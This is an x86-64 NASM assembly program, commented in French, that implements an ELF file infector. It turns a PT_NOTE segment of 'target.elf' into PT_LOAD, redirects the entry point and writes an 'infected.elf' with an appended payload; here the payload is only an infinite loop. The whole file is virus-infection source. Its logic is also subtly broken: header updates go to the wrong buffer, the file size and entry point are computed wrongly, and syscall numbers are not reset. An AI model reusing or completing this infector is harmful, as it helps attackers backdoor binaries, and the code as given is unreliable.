section .data
    file_name db "target.elf", 0         ; Nom du fichier ELF cible
    infected_file db "infected.elf", 0  ; Nom du fichier ELF infecté à créer
    
    no_note_msg db "No PT_NOTE segment found.", 10, 0  ; Message avec saut de ligne
    no_note_msg_len equ $ - no_note_msg               ; Calculer la longueur du message
    load_msg db "PT_NOTE -> PT_LOAD", 10, 0  ; Message avec saut de ligne
    load_msg_len equ $ - load_msg               ; Calculer la longueur du message
    
    note_type dd 0x4                    ; Type PT_NOTE
    load_type dd 0x1                    ; Type PT_LOAD
    payload db 0xEB, 0xFE               ; Payload : boucle infinie (jmp $)

section .bss
    elf_header resb 64                  ; Buffer pour stocker l'en-tête ELF (64 octets)
    program_headers resb 512            ; Buffer pour les Program Headers
    ph_offset resd 1                    ; Variable pour l'offset des Program Headers
    entry_point resq 1                  ; Variable pour stocker le point d'entrée original

section .text
global _start

_start:
    ; Ouvrir le fichier ELF cible
    mov rax, 2                           ; syscall: open
    lea rdi, [file_name]                 ; Charger le nom du fichier ELF
    xor rsi, rsi                         ; Mode: O_RDONLY
    syscall                              ; Appeler open()
    test rax, rax                        ; Vérifier si le fichier s'est ouvert
    js exit                              ; Si erreur, quitter
    mov rdi, rax                         ; Sauvegarder le descripteur de fichier

    ; Lire l'en-tête ELF
    mov rax, 0                           ; syscall: read
    lea rsi, [elf_header]                ; Buffer pour stocker l'en-tête ELF
    mov rdx, 64                          ; Taille de l'en-tête ELF
    syscall                              ; Lire 64 octets dans elf_header
    test rax, rax                        ; Vérifier si la lecture a réussi
    js exit                              ; Si erreur, quitter

    ; Extraire l'offset de la table des Program Headers
    mov rax, [elf_header + 0x20]         ; Lire l'offset vers les Program Headers
    mov [ph_offset], eax                 ; Sauvegarder l'offset dans ph_offset

    ; Lire les Program Headers
    mov rax, 0                           ; syscall: read
    lea rsi, [program_headers]           ; Buffer pour stocker les Program Headers
    mov rdx, 512                         ; Taille à lire (max)
    syscall                              ; Lire les Program Headers dans program_headers
    test rax, rax                        ; Vérifier si la lecture a réussi
    js exit                              ; Si erreur, quitter

    ; Rechercher le segment PT_NOTE
    lea rsi, [program_headers]           ; Charger la table des Program Headers
    mov rcx, 64                          ; Nombre maximal d'entrées
find_note:
    mov eax, [note_type]                 ; Charger le type PT_NOTE
    cmp [rsi], eax                       ; Comparer avec le type actuel
    je convert_to_load                   ; Si trouvé, passer à la conversion
    add rsi, 0x38                        ; Avancer au Program Header suivant (56 octets)
    loop find_note                       ; Continuer jusqu'à épuisement
    
     ; Afficher un message si aucun PT_NOTE n'est trouvé
    lea rsi, [no_note_msg]               ; Charger l'adresse du message
    mov rdx, no_note_msg_len             ; Charger la longueur du message
    mov rax, 1                           ; syscall: write
    mov rdi, 1                           ; stdout
    syscall                              ; Écrire le message sur stdout
    
    jmp exit                             ; Si aucun PT_NOTE trouvé, quitter

convert_to_load:
    ; Convertir PT_NOTE en PT_LOAD
    mov eax, [load_type]                 ; Charger le type PT_LOAD
    mov [rsi], eax                       ; Modifier le type en PT_LOAD
         ; Afficher un message si un PT_NOTE est convert en PT_LOAD
    lea rsi, [load_msg]               ; Charger l'adresse du message
    mov rdx, load_msg_len             ; Charger la longueur du message
    mov rax, 1                           ; syscall: write
    mov rdi, 1                           ; stdout
    syscall                              ; Écrire le message sur stdout

    ; Mettre à jour p_offset et p_vaddr
    mov rax, [elf_header + 0x28]         ; Obtenir la taille actuelle du fichier
    mov qword [rsi + 0x08], rax          ; Mettre à jour p_offset
    mov rbx, 0x400000                    ; Base d'adresse virtuelle pour PT_LOAD
    add rbx, rax                         ; Calculer p_vaddr (base + offset)
    mov qword [rsi + 0x10], rbx          ; Mettre à jour p_vaddr
    mov qword [rsi + 0x20], 0x1000       ; Mettre à jour p_memsz (taille mémoire)

    ; Sauvegarder le point d'entrée original
    mov rax, [elf_header + 0x18]         ; Lire e_entry (point d'entrée original)
    mov [entry_point], rax               ; Sauvegarder le point d'entrée original
    add rbx, rax                         ; Calculer le nouveau point d'entrée
    mov [elf_header + 0x18], rbx         ; Mettre à jour e_entry avec le nouveau point

    ; Créer le fichier infecté
    mov rax, 2                           ; syscall: open
    lea rdi, [infected_file]             ; Charger le nom du fichier infecté
    mov rsi, 0x42                        ; Flags: O_WRONLY | O_CREAT
    mov rdx, 0x1B6                       ; Permissions: rw-rw-rw- (0666)
    syscall                              ; Créer le fichier
    test rax, rax                        ; Vérifier si le fichier a été créé
    js exit                              ; Si erreur, quitter
    mov rdi, rax                         ; Sauvegarder le descripteur du fichier infecté

    ; Écrire l'en-tête ELF dans le fichier infecté
    mov rax, 1                           ; syscall: write
    lea rsi, [elf_header]                ; Buffer contenant l'en-tête ELF
    mov rdx, 64                          ; Taille de l'en-tête ELF
    syscall                              ; Écrire l'en-tête ELF

    ; Écrire les Program Headers dans le fichier infecté
    lea rsi, [program_headers]
    mov rdx, 512
    syscall                              ; Écrire les Program Headers

    ; Ajouter le payload à la fin du fichier infecté
    lea rsi, [payload]                   ; Charger le payload
    mov rdx, 2                           ; Taille du payload
    syscall                              ; Ajouter le payload au fichier

exit:
    ; Quitter le programme proprement
    mov rax, 60                          ; syscall: exit
    xor rdi, rdi                         ; Code de sortie 0
    syscall                              ; Terminer le programme

